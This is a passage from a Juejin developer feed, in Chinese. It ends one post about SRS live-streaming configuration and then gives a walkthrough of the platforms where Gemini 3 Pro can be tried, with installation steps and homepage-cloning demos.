        enabled     on<span class="hljs-comment">;</span>
        rtmp_to_rtc on<span class="hljs-comment">; # RTMP推流转WebRTC播放</span>
        rtc_to_rtmp on<span class="hljs-comment">; # WebRTC推流转RTMP播放</span>
    }

    <span class="hljs-comment"># 播放优化：GOP缓存+队列控制</span>
    play {
        gop_cache_max_frames 2500<span class="hljs-comment">;</span>
        gop_cache on<span class="hljs-comment">; # 缓存GOP实现秒开</span>
        queue_length 10<span class="hljs-comment">; # 播放队列长度（缓存10帧）</span>
    }
}
</code></pre>
<h4 data-id="heading-11">踩坑与解决</h4>
<ul>
<li>AI 提供的配置常出现语法错误（如路径格式、参数冲突），需结合官方文档逐行校验；</li>
<li>WebRTC 推流需确保<code>candidate</code>配置正确（公网 IP / 端口映射），否则无法建立连接；</li>
<li>低延迟优化需关闭 GOP 缓存、缩短 HLS 切片、减小播放器缓冲。</li>
</ul>
<h2 data-id="heading-12">三、收获与总结</h2>
<ol>
<li>
<p><strong>协议选型无优劣，适配场景是关键</strong>：
互动场景选 WebRTC，低延迟直播选 SRT/RTMP，跨平台兼容选 LL-HLS；</p>
</li>
<li>
<p><strong>开源工具的力量</strong>：SRS 这类成熟框架节省了底层开发成本，聚焦业务逻辑即可快速落地；</p>
</li>
<li>
<p><strong>实践出真知</strong>：从手动封装组件到踩坑 SRS 配置，每一步试错都加深了对直播技术栈的理解。</p>
</li>
</ol>
<p>目前已实现 OBS（WebRTC）推流、前端 / VLC 拉流的低延迟直播，后续计划探索 SRT 协议集成、高并发优化。<strong>万事开头难，技术沉淀在于持续踩坑与复盘</strong>~</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[体验Gemini 3 Pro的N多种方式]]></title>    <link>https://juejin.cn/post/7575106644498989090</link>    <guid>https://juejin.cn/post/7575106644498989090</guid>    <pubDate>2025-11-23T05:43:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575106644498989090" data-draft-id="7575015480198627380" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="体验Gemini 3 Pro的N多种方式"/> <meta itemprop="keywords" content="Gemini,AIGC"/> <meta itemprop="datePublished" content="2025-11-23T05:43:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="小溪彼岸"/> <meta itemprop="url" content="https://juejin.cn/user/976781670357400"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            体验Gemini 3 Pro的N多种方式
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/976781670357400/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    小溪彼岸
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T05:43:14.000Z" title="Sun Nov 23 2025 05:43:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>小伙伴们大家好，我是小溪，见字如面。这两天被Gemini 3 Pro模型的发布刷屏了，各种模型排行第一，各种炸裂了，看的眼花缭乱的，本人就不凑热闹去炸裂了（本人一直觉得能帮助自己解决问题的模型就是强的，分数就像西医制定的各种判定一个人是否正常的指标，只能作为一个参考，没有太大意义），在这里整理一下体验Gemini 3 Pro的体验方式和简单Demo看一下Gemini 3 Pro的实力，纯个人把玩仅供参考。</p>
<p>这里贴一下官方和知名模型测评平台的测评结果，在全球权威的模型评测榜单Artificial Analysis里，Gemini 3 排名第一。</p>
<p>Artificial Analysis官网地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fartificialanalysis.ai%2Fmodels%2Fgpt-5%3Fintelligence%3Dartificial-analysis-intelligence-index" target="_blank" title="https://artificialanalysis.ai/models/gpt-5?intelligence=artificial-analysis-intelligence-index" ref="nofollow noopener noreferrer">artificialanalysis.ai/models/gpt-…</a></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/afce0e406bd346a3849fdd07cc1bc2b3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=eqIJEE1erGbV25qLaWhMYEX2E2M%3D" alt="图片" loading="lazy"/></p>
<p>Gemini 3 Pro的跑分也强的离谱，除了软件工程能力比GPT-5.1、CLaude Sonnet 4.5略低，其他能力方面基本上都是遥遥领先</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/772946b38d9645c1a9bd4e1f48ef5f81~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=WvZ3k09QeWQR%2BlBjH%2Bp4d4aALiw%3D" alt="图片" loading="lazy"/></p>
<h2 data-id="heading-1">Google Gemini</h2>
<h3 data-id="heading-2">优势</h3>
<ul>
<li>官方支持，免费使用</li>
</ul>
<h3 data-id="heading-3">限制</h3>
<ul>
<li>需要Google账号</li>
<li>需要科学上网环境</li>
</ul>
<h3 data-id="heading-4">使用</h3>
<p>官网地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgemini.google.com" target="_blank" title="https://gemini.google.com" ref="nofollow noopener noreferrer">gemini.google.com</a></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3826d4f73fad4268ab40b843f211206c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=qja50mBjLSVNSTMEyviwXaab80w%3D" alt="图片" loading="lazy"/></p>
<p>Gemini官网已默认使用了Gemini 3 Pro模型，直接在对话框输入提示词</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5ec3474b4449436f939902fe431595dd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=ndmetUk3ONaVmbqftcUTQHtRuQ4%3D" alt="图片" loading="lazy"/></p>
<p>任务完成后，复制代码保存到本地 index.html 文件，在浏览器中打开效果如下，就不做评价了，毕竟千人千面</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/470544273da2488c8df54f16f5ad475c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=s%2FXe2%2BFvoT7rBgw%2B5pk9pBzXHcw%3D" alt="图片" loading="lazy"/></p>
<p>截止复刻一下MiniMax的官网，MiniMax的官网还是有技术含量的，之前使用MiniMax-M2也无法复现，感兴趣的小伙伴可以看往期内容：<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzU5Njg3ODUzOA%3D%3D%26mid%3D2247493520%26idx%3D1%26sn%3Da927c6291984349476945d1437794b60%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzU5Njg3ODUzOA==&amp;mid=2247493520&amp;idx=1&amp;sn=a927c6291984349476945d1437794b60&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">追赶一趟Minimax M2限时免费末班车</a></p>
<pre><code class="hljs language-arduino" lang="arduino">https:<span class="hljs-comment">//www.minimaxi.com 复刻MiniMax官网首页</span>
</code></pre>
<p>复刻完成后，效果如下：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/377dc3dc546744af957dfff926004c39~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=PKefdzjVoBKCRT4Cgxz67a0BiHk%3D" alt="图片" loading="lazy"/></p>
<h2 data-id="heading-5">Google AI Studio</h2>
<h3 data-id="heading-6">优势</h3>
<ul>
<li>官方支持，免费使用</li>
</ul>
<h3 data-id="heading-7">限制</h3>
<ul>
<li>需要Google账号</li>
<li>需要科学上网环境</li>
</ul>
<h3 data-id="heading-8">使用</h3>
<p>官网地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Faistudio.google.com" target="_blank" title="https://aistudio.google.com" ref="nofollow noopener noreferrer">aistudio.google.com</a></p>
<p>在Google AI Studio首页，点击【Gemini 3 Pro Preview】即可使用Gemini 3 Pro模型</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dd9755a534f340b6ab78680a9d2d4fa0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=Lqhq50D%2Fc8P5inFZV5rzGIk9uzA%3D" alt="图片" loading="lazy"/></p>
<p>在模型列表可以看到Gemini 3 Pro的 计费方式 和 知识库截止时间</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a783e21132f7400f92f772e909052974~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=3GTWKXKMWUqjPuFh0UOBumVMnCo%3D" alt="图片" loading="lazy"/></p>
<p>使用同样的提示词，在Google AI Studio上复刻的bilibili官网首页效果如下：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/99a3cb4c9980461a88a226102f74e62e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=XDxev8rmjcVhON%2BSensqOvY0t%2Fc%3D" alt="图片" loading="lazy"/></p>
<p>复刻的MiniMax官网首页效果如下：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/513fea0e979649779a0ee4bc8f1110af~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=ieeMBzAio4prMkhYQL1LEOsfpQU%3D" alt="图片" loading="lazy"/></p>
<h2 data-id="heading-9">Google Antigravity IDE</h2>
<h3 data-id="heading-10">优势</h3>
<ul>
<li>预览阶段免费使用</li>
<li>支持 Gemini 3 Pro、Claude Sonnet 4.5</li>
</ul>
<h3 data-id="heading-11">限制</h3>
<ul>
<li>需要Google账户，对账号有一定的要求</li>
<li>需要科学上网环境</li>
<li>Gemini 3 Pro（High）每天有使用次数限制</li>
</ul>
<h3 data-id="heading-12">使用</h3>
<p>Antigravity是Google随着Gemini 3 Pro模型上线一起发布的Agent IDE，已默认支持Gemini 3 Pro模型</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e1176a01489443738bac5cd68e19d37d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=Idwt8gOnZkrQ2XOb2Q0nd3ROnaE%3D" alt="图片" loading="lazy"/></p>
<p>在Antigravity IDE上使用 Gemini 3 Pro（Low）（为什么不使用High，因为High每天有使用额度限制），Antigravity直接使用Next.js实现了，实现bilibili官网首页的复刻效果如下：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3f87506b6f364222b4fc9a00f9e13cca~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=AhU7Mfq25svlHX9eGvhBIl7Ri98%3D" alt="图片" loading="lazy"/></p>
<p>复刻的MiniMax官网首页效果如下：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ccf4c55e21d04c55af7b3934c692e743~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=l031BGlS5KhMgCkeQwi1%2BBXgRvg%3D" alt="图片" loading="lazy"/></p>
<h2 data-id="heading-13">Gemini CLI</h2>
<p>对Gemini CLI感兴趣的小伙伴可以看往期内容：<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzU5Njg3ODUzOA%3D%3D%26mid%3D2247492558%26idx%3D1%26sn%3De762047c93c4361f63744ec3c70a434f%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzU5Njg3ODUzOA==&amp;mid=2247492558&amp;idx=1&amp;sn=e762047c93c4361f63744ec3c70a434f&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">Google百万Token上下文Gemini CLI，离AI自由更近一步</a></p>
<h3 data-id="heading-14">优势</h3>
<ul>
<li>Google AI Ultra、Gemini API密钥、Vertex API密钥付费用户自动开启权限</li>
</ul>
<h3 data-id="heading-15">限制</h3>
<ul>
<li>需要科学上网环境</li>
<li>免费用户需要加入候补名单</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4565396fae614b2f8aa27160badbc568~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=ThpLs1vSSCaulJv9satqqSU2HwU%3D" alt="图片" loading="lazy"/></p>
<p>官方候补地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.google.com%2Fforms%2Fd%2Fe%2F1FAIpQLScQBMmnXxIYDnZhPtTP3xr5IwHNzKW4nLomuQ1tGOO-UldMdQ%2Fviewform%3Fpli%3D1" target="_blank" title="https://docs.google.com/forms/d/e/1FAIpQLScQBMmnXxIYDnZhPtTP3xr5IwHNzKW4nLomuQ1tGOO-UldMdQ/viewform?pli=1" ref="nofollow noopener noreferrer">docs.google.com/forms/d/e/1…</a></p>
<h3 data-id="heading-16">使用</h3>
<blockquote>
<p>在Gemini CLI中使用Gemini 3 Pro需要先到设置中开启【Preview Features】</p>
</blockquote>
<p>更新到Gemini CLI最新版本，在命令行终端执行命令：</p>
<pre><code class="hljs language-ruby" lang="ruby"><span class="hljs-variable">$ </span>npm install -g <span class="hljs-variable">@google</span>/gemini-cli<span class="hljs-variable">@latest</span>
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b389cd659bf44fd7be813dec1af9c5e1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=%2BshVfw%2Fm36hap9ZTSDsAHaIhUqQ%3D" alt="图片" loading="lazy"/></p>
<p>如果是Google账号登录的会出现如下提示，使用Gemini 3 Pro需要先加入候补名单</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/136e5eb2042a45fab1820d566d8c3533~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=ElVCsgjPr19KTwjuOFmdf8gq%2By8%3D" alt="图片" loading="lazy"/></p>
<p>这里我们使用Gemini API Key登录，在交互式命令中输入 /auth 打开登录授权页面，选择【Use Gemini API Key】</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d39776ad1b46436c875137d271bf827c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=0NNfDBWgLJV1FGwW4qGgh8oOATU%3D" alt="图片" loading="lazy"/></p>
<p>输入Gemini API Key</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0ce5819e651546cbb169cc980a2af612~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=cWerSb0tvq7%2FWhLsv%2BtBVbQ99k8%3D" alt="图片" loading="lazy"/></p>
<p>登录成功后，在交互式命令中输入 /settings 打开设置，找到【Preview Features】开启</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/926a3a910503493588e2566e4d922393~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=lWZ9Yk06BITuz%2FFAXQTCesmljmM%3D" alt="图片" loading="lazy"/></p>
<p>开启成功后，重启Gemini CLI，在交互式命令中输入 /model 就可以看到 gemini-3-pro-preview 模型了，然后选择Pro模型</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3740ecd6e6d043c7ad4e4087e8faf48a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=kMHtoj5jRVssE1cxRftaajuhKmM%3D" alt="图片" loading="lazy"/></p>
<p>切换成功后，对话框右侧会显示【Pro】，然后就可以使用Gemini 3 Pro模型了</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f10e1734309f4cc3beb09f4800f4468f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=XYBc4i3udmFCuQ3aBvJ6EK6NwE8%3D" alt="图片" loading="lazy"/></p>
<p>免费用户无法使用会提示错误</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dfdcc599329b4da4a6f3c70fb51c70b1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=nTBU4Y8CAx%2BtwInrj7m%2FtSH9zE4%3D" alt="图片" loading="lazy"/></p>
<h2 data-id="heading-17">Cursor</h2>
<h3 data-id="heading-18">优势</h3>
<ul>
<li>可以使用Cursor特性功能</li>
</ul>
<h3 data-id="heading-19">限制</h3>
<ul>
<li>
<p>需要订阅Cursor</p>
</li>
<li>
<p>需要配置科学上网环境</p>
</li>
</ul>
<h3 data-id="heading-20">使用</h3>
<p>Cursor中已经支持了Gemin 3 Pro模型，开通Cursor订阅的小伙伴选择模型后可以直接使用，本人Cursor会员到期了这里就不做演示了。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/278b20dd6935466ba3f9bf783b0a50cf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=Kb81Re%2FszKKzSZMVeOvtC2dAWDQ%3D" alt="图片" loading="lazy"/></p>
<h2 data-id="heading-21">LMArena</h2>
<p>LMArena 由加州大学伯克利分校的研究人员创建，是一个开放平台，每个人都可以轻松访问、探索世界领先的人工智能模型并与之交互。通过并排比较它们并投票以获得更好的回应，社区有助于塑造公共排行榜，使人工智能进步更加透明，并立足于现实世界的使用。</p>
<p>官网地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Flmarena.ai%2F" target="_blank" title="https://lmarena.ai/" ref="nofollow noopener noreferrer">lmarena.ai/</a></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/721ba27542fe48458ed0d0f2f2d8c2b1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=RurNDD6JWQzF1dvwRpueCTDQolE%3D" alt="图片" loading="lazy"/></p>
<h3 data-id="heading-22">优势</h3>
<ul>
<li>免费使用，提供模型对比</li>
<li>提供所有主流模型</li>
</ul>
<h3 data-id="heading-23">限制</h3>
<ul>
<li>需要科学上网环境</li>
</ul>
<h3 data-id="heading-24">使用</h3>
<p>在LMArena首页选择【gemini-3-pro】模型</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9e22f1ab995746268f4c93658058ff9c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=tor%2BIm8TmyzxcepPR%2F%2FBT%2FFR5Sg%3D" alt="图片" loading="lazy"/></p>
<p>输入同样的提示词，在LMArena上复刻的bilibili官网首页效果如下（感觉这个是目前复刻效果最好的一次，难道官方降智了？🤣）</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bbf7541758f7480182558141161b573c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=K96PKRu0FCA3A7eBdASQyMqDrVI%3D" alt="图片" loading="lazy"/></p>
<p>复刻的MiniMax官网首页效果如下（MiniMax官网含金量还在上升😂）</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f1743377cd904229b1c3165ae6d22c68~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=0p1xoz2nfoigomtHNXOXVO87mBc%3D" alt="图片" loading="lazy"/></p>
<h2 data-id="heading-25">OpenRouter</h2>
<p>官网地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fopenrouter.ai" target="_blank" title="https://openrouter.ai" ref="nofollow noopener noreferrer">openrouter.ai</a></p>
